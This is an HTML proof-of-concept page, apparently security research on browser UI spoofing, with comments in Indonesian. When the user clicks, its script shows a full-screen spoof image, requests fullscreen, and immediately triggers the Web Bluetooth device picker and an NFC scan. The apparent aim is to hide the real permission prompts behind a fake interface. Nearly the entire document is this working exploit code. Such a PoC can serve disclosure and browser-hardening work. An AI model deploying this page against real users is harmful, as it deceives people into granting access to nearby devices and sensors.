<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security Research - Sync UI Spoof</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #fff;
        }         
        #spoof {
            width: 100%;
            height: 100%;
            display: none;
            object-fit: cover;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999;
        }
        #content {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }
    </style>
</head>  
<body>
    <img id="spoof" src="spoof.png.jpeg">

    <div id="content">
        <div style="padding: 50px; border: 2px solid #000; cursor: pointer;">
            <h1>Click to Start Test</h1>
            <p>(Direct Sync Execution)</p>
        </div>
    </div>

    <script>
        window.onclick = async () => {
            const spoofImg = document.getElementById("spoof");
            const mainContent = document.getElementById("content");
            const elem = document.documentElement;

            // 1. Tampilkan gambar spoof segera (sinkron)
            spoofImg.style.display = "block";
            mainContent.style.display = "none";

            // 2. Minta Fullscreen (asinkron tapi tanpa delay buatan)
            try {
                if (elem.requestFullscreen) {
                    await elem.requestFullscreen();
                }
            } catch (err) {
                console.log("Fullscreen gagal");
            }

            // 3. Langsung pemicu Dialog Bluetooth
            try {
                await navigator.bluetooth.requestDevice({
                    acceptAllDevices: true
                });
            } catch (e) {
                console.log("Bluetooth dialog dismissed");
            }

            // 4. Langsung pemicu NFC Scan
            try {
                if ('NDEFReader' in window) {
                    const ndef = new NDEFReader();
                    await ndef.scan();
                }
            } catch (e) {
                console.log("NFC failed");
            }
        };
    </script>
</body>
</html>
